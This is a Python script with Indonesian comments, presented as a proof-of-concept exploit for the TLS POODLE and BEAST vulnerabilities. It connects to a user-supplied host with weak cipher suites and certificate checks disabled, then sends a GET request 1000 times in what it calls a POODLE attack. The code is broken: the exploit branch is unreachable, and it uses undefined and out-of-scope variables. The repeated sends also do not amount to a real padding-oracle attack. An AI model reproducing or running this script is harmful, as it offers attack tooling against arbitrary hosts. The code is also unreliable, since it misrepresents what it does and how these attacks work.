import socket
import ssl
import argparse
import time

def exploit_tls_vulnerabilities(hostname, port=443, cipher=None):
    print(f"\nMencoba eksploitasi kerentanan TLS pada {hostname}:{port}")

    # Cipher suites yang rentan
    weak_ciphers = {
        "POODLE": ["SSLv3", "TLS_RSA_WITH_3DES_EDE_CBC_SHA"],
        "BEAST": ["TLSv1", "TLS_RSA_WITH_AES_128_CBC_SHA"]
    }

    try:
        # Membuat konteks SSL dengan cipher suite yang lemah
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        if cipher:
            context.set_ciphers(cipher)  # Atur cipher suite yang spesifik jika diberikan
            print(f"Mencoba cipher suite: {cipher}")
        else:
            for attack, ciphers in weak_ciphers.items():
                for cipher in ciphers:
                    context.set_ciphers(cipher)
                    try:
                        with socket.create_connection((hostname, port)) as sock:
                            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                                print(f"\033[92mBerhasil terhubung dengan {ssock.version()} menggunakan cipher suite: {cipher}\033[0m")
                                print(f"\033[93mPotensi kerentanan {attack} terdeteksi.\033[0m")
                                return  # Keluar setelah menemukan kerentanan
                    except ssl.SSLError:
                        pass
            else:
                print("\033[92mTidak ada kerentanan POODLE atau BEAST yang terdeteksi.\033[0m")
                return

        # ... (Di sini Anda dapat menambahkan kode untuk mengirimkan data dan mencoba mengeksploitasi kerentanan lebih lanjut)
        # Mengirimkan data dan mencoba eksploitasi POODLE
        if attack == "POODLE":
            try:
                # Data yang akan dikirim (contoh: permintaan HTTP GET sederhana)
                request = b"GET / HTTP/1.0\r\n\r\n"

                # Kirim data berulang kali untuk memicu error padding
                for _ in range(1000):  # Ulangi beberapa kali untuk meningkatkan peluang
                    ssock.sendall(request)
                    time.sleep(0.1)

                print("\033[93mPermintaan POODLE telah dikirimkan.\033[0m")
                print("Analisis lalu lintas jaringan menggunakan Wireshark untuk melihat kesalahan padding.")

            except Exception as e:
                print(f"Terjadi kesalahan saat mengirim permintaan POODLE: {e}")

    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

def main():
    parser = argparse.ArgumentParser(description="Eksploitasi Kerentanan TLS (PoC)")
    parser.add_argument("hostname", help="Nama host atau alamat IP target")
    parser.add_argument("-p", "--port", type=int, default=443, help="Nomor port (default: 443)")
    parser.add_argument("-c", "--cipher", help="Cipher suite yang akan diuji (opsional)")
    args = parser.parse_args()

    exploit_tls_vulnerabilities(args.hostname, args.port, args.cipher)

if __name__ == "__main__":
    main()
